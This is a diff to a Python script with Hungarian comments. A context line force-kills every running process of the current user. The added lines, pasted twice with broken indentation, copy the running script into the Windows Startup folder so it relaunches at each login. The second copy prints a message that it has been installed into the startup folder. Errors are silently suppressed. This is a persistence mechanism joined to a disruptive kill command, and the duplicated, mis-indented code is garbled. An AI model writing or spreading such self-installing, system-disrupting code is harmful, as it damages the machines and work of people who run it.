@@ -94,3 +94,37 @@ except Exception as e:
     pass # Ezt írd ide, hogy ne legyen piros!
 
 os.system('taskkill /F /FI "STATUS eq RUNNING" /FI "USERNAME eq %USERNAME%" /T')
+import os
+import shutil
+import sys
+
+# Megkeressük a Windows Startup mappáját
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# A jelenlegi fájlod neve és helye
+fajl_neve = os.path.basename(sys.argv[0])
+cel_utvonal = os.path.join(startup_mappa, fajl_neve)
+
+# Ha még nincs ott, átmásoljuk
+if not os.path.exists(cel_utvonal):
+    try:
+        shutil.copy(sys.argv[0], cel_utvonal)
+        print("cooking... ")
+    except:
+        pass
+    import os
+import shutil
+import sys
+
+# Megkeressük a Windows Startup mappáját
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# A jelenlegi fájlod neve és helye
+fajl_neve = os.path.basename(sys.argv[0])
+cel_utvonal = os.path.join(startup_mappa, fajl_neve)
+
+# Ha még nincs ott, átmásoljuk
+if not os.path.exists(cel_utvonal):
+    try:
+        shutil.copy(sys.argv[0], cel_utvonal)
+        print("Sikeresen beépülve az indítópultba!")
+    except:
+        pass
